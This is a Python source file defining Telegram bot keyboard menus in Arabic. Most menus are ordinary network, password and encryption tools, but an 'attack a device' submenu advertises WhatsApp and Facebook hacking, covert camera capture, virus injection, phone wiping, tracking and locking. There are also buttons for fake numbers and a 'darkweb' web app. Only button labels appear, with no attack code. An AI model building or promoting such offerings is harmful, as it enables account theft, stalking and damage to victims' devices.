from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton, WebAppInfo

# ======= الكيبورد الرئيسي الأصلي + إضافة أزرار جديدة =======
def main_menu():
    kb = InlineKeyboardMarkup(row_width=2)  # كل صف يحتوي على 2 زر إذا كان زوجي

    # --- الأزرار القديمة ---
    kb.add(InlineKeyboardButton("ارقام فيك ☎️", callback_data="numbers"))
    kb.add(
        InlineKeyboardButton("صيد يوزر ✨", callback_data="vip"),
        InlineKeyboardButton("فحص الروابط 🔎", callback_data="check_link")
    )
    kb.add(
        InlineKeyboardButton("BOT 2", url="https://t.me/ALMNHRF_Toobot"),
        InlineKeyboardButton("دعم البوت ⚙️", callback_data="contact_dev")
    )
    kb.add(
        InlineKeyboardButton(
            "المطور 🥷",
            web_app=WebAppInfo(url="https://vkbkjhhii.github.io/Mon7aref1KBot/")
        ),
        InlineKeyboardButton(
            "Farm GPT",
            web_app=WebAppInfo(url="https://vkbkjhhii.github.io/Mon7aref1KBot/darkweb.html")
        )
    )
    kb.add(InlineKeyboardButton("الهجوم علي جهاز 🚸", callback_data="far3od_menu"))

    # --- الأزرار الجديدة المضافة (AI + Security + Network + Tools) ---
    kb.add(
        InlineKeyboardButton("🤖 الذكاء الاصطناعي", callback_data="ai_menu"),
        InlineKeyboardButton("🛡️ فحص الأمان", callback_data="security_menu")
    )
    kb.add(
        InlineKeyboardButton("🌐 أدوات الشبكات", callback_data="network_menu"),
        InlineKeyboardButton("🛠️ أدوات", callback_data="tools_menu")
    )
    kb.add(
        InlineKeyboardButton("🕵️ OSINT", callback_data="osint_menu"),
        InlineKeyboardButton("📚 التعلم", callback_data="learn_menu")
    )
    kb.add(
        InlineKeyboardButton("⚠️ التوعية", callback_data="awareness_menu"),
        InlineKeyboardButton("👤 حسابي", callback_data="account_menu")
    )
    kb.add(InlineKeyboardButton("💎 الاشتراك", callback_data="vip_menu"))
    kb.add(InlineKeyboardButton("📞 الدعم", callback_data="support_menu"))

    return kb

# ===== قائمة فرعود (أزواج + فردي) =======
def far3od_menu():
    kb = InlineKeyboardMarkup(row_width=2)
    kb.add(
        InlineKeyboardButton("اختراق وتس 💀", callback_data="far3od_1"),
        InlineKeyboardButton("اختراق فيس💀", callback_data="far3od_2")
    )
    kb.add(
        InlineKeyboardButton("كاميرا اماميه 📸", callback_data="far3od_3"),
        InlineKeyboardButton("كاميرا اخفيه 📷", callback_data="far3od_4")
    )
    kb.add(
        InlineKeyboardButton("حقن فيرس 🦠", callback_data="far3od_5"),
        InlineKeyboardButton("فرمته الهاتف📁", callback_data="far3od_6")
    )
    kb.add(
        InlineKeyboardButton("تتبع الهاتف 🗿", callback_data="far3od_7"),
        InlineKeyboardButton("قفل الهاتف 🔒", callback_data="far3od_8")
    )
    kb.add(InlineKeyboardButton("اختراق كاملاً 🔞", callback_data="far3od_9"))
    kb.add(InlineKeyboardButton("العوده 🔘", callback_data="home"))
    return kb

# ===== زر الرجوع للقائمة الرئيسية =======
def back_btn():
    kb = InlineKeyboardMarkup(row_width=1)
    kb.add(InlineKeyboardButton("القائمه الرئيسيه↜", callback_data="home"))
    return kb

# ===== قوائم فرعية جديدة (AI / Security / Network / Tools) =======
def ai_menu():
    kb = InlineKeyboardMarkup(row_width=2)
    kb.add(
        InlineKeyboardButton("💬 دردشة AI", callback_data="ai_chat"),
        InlineKeyboardButton("🔗 تحليل رابط", callback_data="ai_link")
    )
    kb.add(
        InlineKeyboardButton("📄 تحليل نص", callback_data="ai_text"),
        InlineKeyboardButton("📧 تحليل ايميل", callback_data="ai_email")
    )
    kb.add(InlineKeyboardButton("⬅️ رجوع", callback_data="home"))
    return kb

def security_menu():
    kb = InlineKeyboardMarkup(row_width=2)
    kb.add(
        InlineKeyboardButton("🔐 فحص كلمة السر", callback_data="check_password"),
        InlineKeyboardButton("📧 فحص ايميل", callback_data="check_email")
    )
    kb.add(
        InlineKeyboardButton("🌐 فحص موقع", callback_data="check_site"),
        InlineKeyboardButton("📊 تقرير", callback_data="security_report")
    )
    kb.add(InlineKeyboardButton("⬅️ رجوع", callback_data="home"))
    return kb

def network_menu():
    kb = InlineKeyboardMarkup(row_width=2)
    kb.add(
        InlineKeyboardButton("📍 IP Info", callback_data="ip_info"),
        InlineKeyboardButton("🌍 Domain", callback_data="domain_info")
    )
    kb.add(
        InlineKeyboardButton("📡 DNS", callback_data="dns_lookup"),
        InlineKeyboardButton("⚡ Ping", callback_data="ping_test")
    )
    kb.add(InlineKeyboardButton("⬅️ رجوع", callback_data="home"))
    return kb

def tools_menu():
    kb = InlineKeyboardMarkup(row_width=2)
    kb.add(
        InlineKeyboardButton("🔑 توليد باسورد", callback_data="gen_pass"),
        InlineKeyboardButton("🔐 تشفير", callback_data="encrypt_text")
    )
    kb.add(
        InlineKeyboardButton("🔓 فك التشفير", callback_data="decrypt_text"),
        InlineKeyboardButton("#️⃣ Hash", callback_data="hash_gen")
    )
    kb.add(InlineKeyboardButton("⬅️ رجوع", callback_data="home"))
    return kb
